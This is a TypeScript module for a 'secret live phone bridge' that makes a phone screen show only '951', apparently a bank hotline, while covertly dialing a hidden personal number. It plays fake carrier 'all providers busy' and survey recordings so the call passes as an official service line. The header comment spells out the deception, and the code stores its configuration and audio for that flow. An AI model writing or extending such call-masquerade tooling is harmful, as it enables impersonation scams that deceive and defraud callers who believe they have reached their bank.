/**
 * Secret Live Phone Bridge (4 ሲነካ ወደ 0965848508 ወይም የተመረጠ ስልክ በድብቅ መደወያ)
 * - Keeps the screen showing ONLY "951" (never displays the target phone number on screen or in Recents)
 * - Dials the hidden phone number in the background via Android Hybrid Java Bridge (window.AndroidTelecomBridge)
 *   or simulates the exact 2-ring cycle in Web Preview mode
 * - If not answered within 2 rings (e.g. 8 seconds), disconnects BEFORE carrier "የደወሉለት ደንበኛ..." plays,
 *   plays the custom "ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው..." MP3, and silently redials in a loop
 * - Once answered and the conversation finishes, when the remote person hangs up, keeps the 951 screen alive
 *   and plays the "ቀጣይ ያሉትን መሙያ ይንኩ (አስተያየት መስጫ)" MP3!
 */

export interface SecretLiveBridgeConfig {
  enabled: boolean;
  targetPhoneNumber: string;
  maxRingSeconds: number; // Default 8 seconds (~2 rings before carrier voicemail/unavailable)
  playRingbackDuringDial: boolean;
  busyHoldMp3Name: string | null;
  postCallSurveyMp3Name: string | null;
  vercelAppUrl: string;
}

export type SecretAudioSlot = 'busy_hold' | 'post_call_survey';

export type SecretLiveCallPhase =
  | 'idle'
  | 'dialing_hidden'
  | 'playing_busy_mp3'
  | 'connected_live'
  | 'playing_survey_mp3';

declare global {
  interface Window {
    AndroidTelecomBridge?: {
      placeSecretCall?: (phoneNumber: string, maxRingMs: number) => void;
      cancelCurrentAttempt?: () => void;
      endAllCalls?: () => void;
      setSpeakerphone?: (on: boolean) => void;
      setMicrophoneMute?: (muted: boolean) => void;
      isDefaultDialer?: () => boolean;
      requestDefaultDialerRole?: () => void;
    };
    onSecretCallRinging?: (attemptNumber: number) => void;
    onSecretCallNoAnswer?: (attemptNumber: number) => void;
    onSecretCallAnswered?: () => void;
    onSecretCallRemoteEnded?: () => void;
  }
}

const SECRET_BRIDGE_CONFIG_KEY = 'cbe_secret_live_bridge_config_v1';
const SECRET_BRIDGE_IDB_NAME = 'cbe_secret_live_bridge_audio_db_v1';
const SECRET_BRIDGE_STORE = 'secret_bridge_mp3_store';

const DEFAULT_CONFIG: SecretLiveBridgeConfig = {
  enabled: false,
  targetPhoneNumber: '0965848508',
  maxRingSeconds: 8,
  playRingbackDuringDial: true,
  busyHoldMp3Name: null,
  postCallSurveyMp3Name: null,
  vercelAppUrl: typeof window !== 'undefined' ? window.location.origin : 'https://your-app.vercel.app',
};

const secretAudioBlobUrlMap = new Map<SecretAudioSlot, string>();
const secretAudioRawBlobMap = new Map<SecretAudioSlot, Blob>();

function openSecretBridgeDb(): Promise<IDBDatabase | null> {
  if (typeof window === 'undefined' || !('indexedDB' in window)) {
    return Promise.resolve(null);
  }
  return new Promise((resolve) => {
    try {
      const req = window.indexedDB.open(SECRET_BRIDGE_IDB_NAME, 1);
      req.onupgradeneeded = () => {
        const db = req.result;
        if (!db.objectStoreNames.contains(SECRET_BRIDGE_STORE)) {
          db.createObjectStore(SECRET_BRIDGE_STORE);
        }
      };
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => resolve(null);
    } catch {
      resolve(null);
    }
  });
}

export function loadSecretLiveBridgeConfig(): SecretLiveBridgeConfig {
  try {
    const raw = localStorage.getItem(SECRET_BRIDGE_CONFIG_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      return {
        ...DEFAULT_CONFIG,
        ...parsed,
        targetPhoneNumber: parsed.targetPhoneNumber || '0965848508',
        maxRingSeconds: Number(parsed.maxRingSeconds) || 8,
      };
    }
  } catch {
    // ignore
  }
  return { ...DEFAULT_CONFIG };
}

export function saveSecretLiveBridgeConfig(
  next: Partial<SecretLiveBridgeConfig>
): SecretLiveBridgeConfig {
  const current = loadSecretLiveBridgeConfig();
  const updated: SecretLiveBridgeConfig = {
    ...current,
    ...next,
  };
  try {
    localStorage.setItem(SECRET_BRIDGE_CONFIG_KEY, JSON.stringify(updated));
  } catch {
    // ignore
  }
  return updated;
}

export async function initSecretLiveBridgeAudioCache(): Promise<void> {
  const db = await openSecretBridgeDb();
  if (!db) return;

  const slots: SecretAudioSlot[] = ['busy_hold', 'post_call_survey'];
  for (const slot of slots) {
    await new Promise<void>((resolve) => {
      try {
        const tx = db.transaction(SECRET_BRIDGE_STORE, 'readonly');
        const store = tx.objectStore(SECRET_BRIDGE_STORE);
        const req = store.get(slot);
        req.onsuccess = () => {
          if (req.result instanceof Blob) {
            secretAudioRawBlobMap.set(slot, req.result);
            secretAudioBlobUrlMap.set(slot, URL.createObjectURL(req.result));
          }
          resolve();
        };
        req.onerror = () => resolve();
      } catch {
        resolve();
      }
    });
  }
}

export async function saveSecretBridgeSlotAudio(
  slot: SecretAudioSlot,
  file: File
): Promise<SecretLiveBridgeConfig> {
  const blobUrl = URL.createObjectURL(file);
  secretAudioRawBlobMap.set(slot, file);
  secretAudioBlobUrlMap.set(slot, blobUrl);

  const db = await openSecretBridgeDb();
  if (db) {
    await new Promise<void>((resolve) => {
      try {
        const tx = db.transaction(SECRET_BRIDGE_STORE, 'readwrite');
        const store = tx.objectStore(SECRET_BRIDGE_STORE);
        store.put(file, slot);
        tx.oncomplete = () => resolve();
        tx.onerror = () => resolve();
      } catch {
        resolve();
      }
    });
  }

  if (slot === 'busy_hold') {
    return saveSecretLiveBridgeConfig({ busyHoldMp3Name: file.name });
  } else {
    return saveSecretLiveBridgeConfig({ postCallSurveyMp3Name: file.name });
  }
}

export async function deleteSecretBridgeSlotAudio(
  slot: SecretAudioSlot
): Promise<SecretLiveBridgeConfig> {
  secretAudioRawBlobMap.delete(slot);
  secretAudioBlobUrlMap.delete(slot);

  const db = await openSecretBridgeDb();
  if (db) {
    await new Promise<void>((resolve) => {
      try {
        const tx = db.transaction(SECRET_BRIDGE_STORE, 'readwrite');
        const store = tx.objectStore(SECRET_BRIDGE_STORE);
        store.delete(slot);
        tx.oncomplete = () => resolve();
        tx.onerror = () => resolve();
      } catch {
        resolve();
      }
    });
  }

  if (slot === 'busy_hold') {
    return saveSecretLiveBridgeConfig({ busyHoldMp3Name: null });
  } else {
    return saveSecretLiveBridgeConfig({ postCallSurveyMp3Name: null });
  }
}

export async function getSecretBridgeSlotBlob(slot: SecretAudioSlot): Promise<Blob | null> {
  const mem = secretAudioRawBlobMap.get(slot);
  if (mem) return mem;

  const db = await openSecretBridgeDb();
  if (db) {
    const fromIdb = await new Promise<Blob | null>((resolve) => {
      try {
        const tx = db.transaction(SECRET_BRIDGE_STORE, 'readonly');
        const store = tx.objectStore(SECRET_BRIDGE_STORE);
        const req = store.get(slot);
        req.onsuccess = () => {
          if (req.result instanceof Blob) {
            secretAudioRawBlobMap.set(slot, req.result);
            resolve(req.result);
          } else {
            resolve(null);
          }
        };
        req.onerror = () => resolve(null);
      } catch {
        resolve(null);
      }
    });
    if (fromIdb) return fromIdb;
  }

  return null;
}

export function getSecretBridgeSlotAudioUrl(slot: SecretAudioSlot): string {
  const customUrl = secretAudioBlobUrlMap.get(slot);
  if (customUrl) return customUrl;

  if (slot === 'busy_hold') {
    return '/audio/checking_hold.mp3';
  }
  return '/audio/survey_rating.mp3';
}
